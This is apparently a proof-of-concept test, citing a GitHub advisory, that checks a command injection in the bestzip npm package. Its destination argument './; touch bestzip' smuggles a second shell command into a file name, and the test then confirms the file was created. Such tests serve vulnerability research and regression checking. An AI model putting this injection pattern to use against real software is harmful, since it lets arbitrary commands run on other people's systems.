//https://github.com/advisories/GHSA-4qqc-mp5f-ccv4
test("Command Injection in bestzip", () => {
  const zip = require("bestzip");
  const fs = require("fs");
  const path = "./bestzip";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  zip({
    source: "",
    destination: "./; touch bestzip",
  });
  sleep.sleep(1);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
